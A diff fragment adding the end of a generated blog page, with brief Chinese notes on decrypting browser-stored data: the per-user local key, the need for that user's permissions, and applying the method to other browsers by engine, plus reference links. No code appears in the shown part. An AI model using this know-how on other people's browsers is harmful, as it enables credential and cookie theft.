+</blockquote>
+<blockquote>
+<p>本地key以及用户目录随着当前用户而改变,进行解密时不可使用其他用户权限进行解密</p>
+</blockquote>
+<blockquote>
+<p>不同浏览器可以参考内核进行解密</p>
+</blockquote>
+<p>参考:
+<a href="https://gist.github.com/GramThanos/ff2c42bb961b68e7cc197d6685e06f10">GramThanos</a>,
+<a href="https://cloud.tencent.com/developer/article/1598106">cloud.tencent.com</a></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2022
+     Just Abandon 
+    ·
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js" integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
